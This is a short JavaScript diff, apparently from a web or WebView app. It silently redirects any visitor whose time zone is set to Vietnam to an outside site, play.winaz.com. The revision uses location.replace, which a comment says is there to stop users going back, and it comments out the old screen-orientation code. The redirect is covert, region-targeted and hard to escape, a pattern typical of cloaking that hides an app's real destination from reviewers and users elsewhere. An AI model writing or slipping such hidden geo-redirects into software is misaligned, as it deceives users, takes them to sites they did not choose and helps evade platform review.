@@ -1,13 +1,18 @@
-const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+(function () {
+  if (typeof window === "undefined" || typeof Intl === "undefined") return;
 
-if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
-    AndroidOrientation.lockLandscape();
+  const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
+
+  if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
+    // if (window.AndroidOrientation?.lockLandscape) {
+    //   window.AndroidOrientation.lockLandscape();
+    // }
+    const to = "https://play.winaz.com/";
+    window.location.replace(to); // dùng replace để tránh quay lại trang trước
   }
-  var to = "https://play.winaz.com/";
-  window.location.href = to;
-} else {
-  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
-    AndroidOrientation.lockPortrait();
-  }
-}
+  // else {
+  //   if (window.AndroidOrientation?.lockPortrait) {
+  //     window.AndroidOrientation.lockPortrait();
+  //   }
+  // }
+})();
